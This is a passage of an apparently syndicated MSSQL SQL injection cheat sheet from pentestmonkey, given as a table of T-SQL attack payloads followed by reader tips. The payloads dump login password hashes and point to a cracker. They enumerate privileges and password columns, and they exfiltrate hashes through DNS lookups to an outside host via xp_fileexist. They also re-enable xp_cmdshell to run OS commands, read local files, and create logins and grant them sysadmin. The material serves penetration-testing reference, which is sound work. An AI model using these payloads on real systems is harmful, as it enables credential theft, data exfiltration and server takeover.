SELECT name, password_hash FROM master.sys.sql_logins &#8212; priv, mssql 2005;<br />
SELECT name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins &#8212; priv, mssql 2005</td>
</tr>
<tr>
<td> Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.  <a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>&#8212; current privs on a particular object in 2005, 2008<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;DATABASE&#8217;); &#8212; current database<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;SERVER&#8217;); &#8212; current server<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;master..syslogins&#8217;, &#8216;OBJECT&#8217;); &#8211;permissions on a table<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;sa&#8217;, &#8216;USER&#8217;);</p>
<p>&#8211;permissions on a user&#8211; current privs in 2005, 2008<br />
SELECT is_srvrolemember(&#8216;sysadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;dbcreator&#8217;);<br />
SELECT is_srvrolemember(&#8216;bulkadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;diskadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;processadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;serveradmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;setupadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;securityadmin&#8217;);</p>
<p>&#8212; who has a particular priv? 2005, 2008<br />
SELECT name FROM master..syslogins WHERE denylogin = 0;<br />
SELECT name FROM master..syslogins WHERE hasaccess = 1;<br />
SELECT name FROM master..syslogins WHERE isntname = 0;<br />
SELECT name FROM master..syslogins WHERE isntgroup = 0;<br />
SELECT name FROM master..syslogins WHERE sysadmin = 1;<br />
SELECT name FROM master..syslogins WHERE securityadmin = 1;<br />
SELECT name FROM master..syslogins WHERE serveradmin = 1;<br />
SELECT name FROM master..syslogins WHERE setupadmin = 1;<br />
SELECT name FROM master..syslogins WHERE processadmin = 1;<br />
SELECT name FROM master..syslogins WHERE diskadmin = 1;<br />
SELECT name FROM master..syslogins WHERE dbcreator = 1;<br />
SELECT name FROM master..syslogins WHERE bulkadmin = 1;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(&#8216;sysadmin&#8217;); &#8212; is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try &#8216;bulkadmin&#8217;, &#8216;systemadmin&#8217; and other values from the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br />
</a> SELECT is_srvrolemember(&#8216;sysadmin&#8217;, &#8216;sa&#8217;); &#8212; is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br />
SELECT name FROM master..syslogins WHERE sysadmin = &#8216;1&#8217; &#8212; tested on 2005</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;<br />
SELECT DB_NAME(N); &#8212; for N = 0, 1, 2, &#8230;</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#8216;mytable&#8217;); &#8212; for the current DB only<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = &#8216;U&#8217;; &#8212; use xtype = &#8216;V&#8217; for views<br />
SELECT name FROM someotherdb..sysobjects WHERE xtype = &#8216;U&#8217;;<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>&#8212; NB: This example works only for the current database.  If you wan&#8217;t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br />
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#8216;U&#8217; AND syscolumns.name LIKE &#8216;%PASSWORD%&#8217; &#8212; this lists table, column for each column containing the word &#8216;password&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC &#8212; gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(&#8216;abcd&#8217;, 3, 1) &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 &#8212; returns 2<br />
SELECT 6 &amp; 1 &#8212; returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0x41) &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) &#8211; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(&#8216;1&#8217; as int);<br />
SELECT CAST(1 as char)</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; + &#8216;B&#8217; &#8211; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 &#8212; returns 1</span></td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END &#8212; returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td> WAITFOR DELAY &#8216;0:0:5&#8217; &#8212; pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(&#8216;master..xp_getfiledetails &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; nonpriv, works on 2000declare @host varchar(800); select @host = name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) + &#8216;.2.pentestmonkey.net&#8217; from sys.sql_logins; exec(&#8216;xp_fileexist &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; priv, works on 2005&#8211; NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.<br />
&#8212; Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell &#8216;net user&#8217;; &#8212; privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#8217;s disabled by default:<br />
EXEC sp_configure &#8216;show advanced options&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv<br />
EXEC sp_configure &#8216;xp_cmdshell&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));<br />
BULK INSERT mydata FROM &#8216;c:boot.ini&#8217;;<br />
DROP TABLE mydata;</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> &#8216;user&#8217;, &#8216;pass&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> &#8216;user&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> &#8216;user&#8217;, &#8216;sysadmin; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; &#8211;location of master.mdf<br />
EXEC sp_helpdb pubs; &#8211;location of pubs.mdf</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind<br />
model<br />
msdb<br />
pubs &#8212; not on sql server 2005<br />
tempdb</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p><strong>From Dan Crowley:</strong><br />
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a></p>
<p><strong>From Jeremy Bae:</strong><br />
Tip about sp_helpdb &#8211; included in table above.</p>
<p><strong>From Trip:</strong><br />
List DBAs (included in table above now):</p>
<blockquote><p>select name from master..syslogins where sysadmin = &#8216;1&#8217;</p></blockquote>
<p><strong>From Daniele Costa:</strong><br />
Tips on using fn_my_permissions in 2005, 2008 &#8211; included in table above.<br />
Also:<br />
To check permissions on multiple database you will have to use the following pattern.</p>
<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)</p></blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.<br />
In this case a simple trick is to use the following syntax:</p>
<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)
</p></blockquote>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
